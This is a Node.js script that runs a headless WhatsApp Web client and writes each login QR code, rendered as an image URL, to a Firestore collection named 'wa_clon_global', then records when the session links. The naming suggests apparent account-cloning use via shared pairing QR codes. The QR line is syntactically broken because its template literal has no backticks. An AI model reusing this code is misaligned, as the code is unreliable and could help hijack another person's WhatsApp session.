const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const express = require('express');
const app = express();

// 1. CARGAR FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

// CONFIGURACIÓN DEL CLIENTE SIN RUTA FIJA (PARA QUE RENDER LO ENCUENTRE SOLO)
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--single-process'
        ]
        // HEMOS QUITADO EL EXECUTABLE PATH PORQUE DABA ERROR
    }
});

client.on('qr', async (qr) => {
    console.log('NUEVO QR RECIBIDO');
    const qrImage = https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=${encodeURIComponent(qr)};
    
    await db.collection("wa_clon_global").doc("current_session").set({
        qrCode: qrImage,
        status: "esperando",
        lastUpdate: admin.firestore.FieldValue.serverTimestamp()
    }, { merge: true });
});

client.on('ready', () => {
    console.log('¡CONEXIÓN EXITOSA!');
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(err => console.error("Error al iniciar Cliente:", err));

const port = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('MOTOR OK'));
app.listen(port, () => console.log('Servidor en puerto ' + port));
